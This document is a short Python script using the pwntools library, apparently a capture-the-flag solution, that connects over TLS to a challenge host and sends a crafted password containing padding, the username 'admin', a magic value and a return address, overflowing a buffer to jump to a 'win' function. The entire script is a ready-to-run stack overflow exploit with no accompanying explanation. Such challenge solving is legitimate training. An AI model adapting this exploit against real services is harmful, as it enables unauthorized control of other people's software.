from pwn import *

HOST = "cgtpztkp.vuln.gg"
PORT = 443
WIN_ADDR = 0x401ca5

username = b"admin"
padding = b"\x00"
payload = b"A" * 36 + username + padding * 3 + p32(0xDEADBEEF) + padding * 8 + p64(WIN_ADDR)

r = remote(HOST, PORT, ssl=True)

r.recvuntil(b"Username:")
r.sendline(username)

r.recvuntil(b"Password:")
r.sendline(payload)

print(r.recvall(timeout=3).decode())
